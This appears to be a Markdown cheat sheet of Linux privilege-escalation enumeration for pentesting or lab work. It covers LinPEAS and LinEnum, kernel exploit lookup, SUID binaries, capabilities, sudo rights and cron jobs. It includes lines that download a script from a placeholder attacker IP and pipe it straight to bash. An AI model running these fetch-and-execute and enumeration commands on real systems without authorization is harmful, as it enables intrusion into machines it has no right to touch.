
## Automated enumeration

[Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1):
```bash
wget http://<IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a

-- OR --

curl http://<IP>linpeas.sh|bash
```
--> `-a` flag adds some additional scanning

[LinEnum](https://github.com/rebootuser/LinEnum):
```bash
wget http://<IP>/linenum.sh
chmod +x linenum.sh
./linenum.sh

-- OR --

curl http://<IP>/linenum.sh|bash
```


### Kernel Exploits

Enumeration commands:
```bash
cat /etc/issue
cat /etc/os-release
cat /proc/version
uname -a
```

Locating exploit:
```bash
searchsploit <kernel version>
```
--> google.com, exploit-db, ...

Fixing `gcc: error trying to exec 'cc1': execvp: No such file or directory`
```bash
# Locate cc1
find / -name cc1 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1

# Add to PATH
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1
```


### Sudo permissions

Enumeration:
```bash
sudo -l
```
--> [gtfobins](https://gtfobins.github.io/)


### SUID binaries

Enumeration:
```bash
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```
--> [gtfobins](https://gtfobins.github.io/)


### Capabilities

Enumeration:
```bash
getcap -r / 2>/dev/null
```
--> [gtfobins](https://gtfobins.github.io/)


### Running processes and services

Enumeration:
```bash
ps aux | grep root
ps -ef

netstat -ano
netstat -tulpn
```
--> Running as root? Vulnerable version? Port forward?


### Cron jobs

Enumeration:
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
--> [pspy](https://github.com/DominicBreuker/pspy)

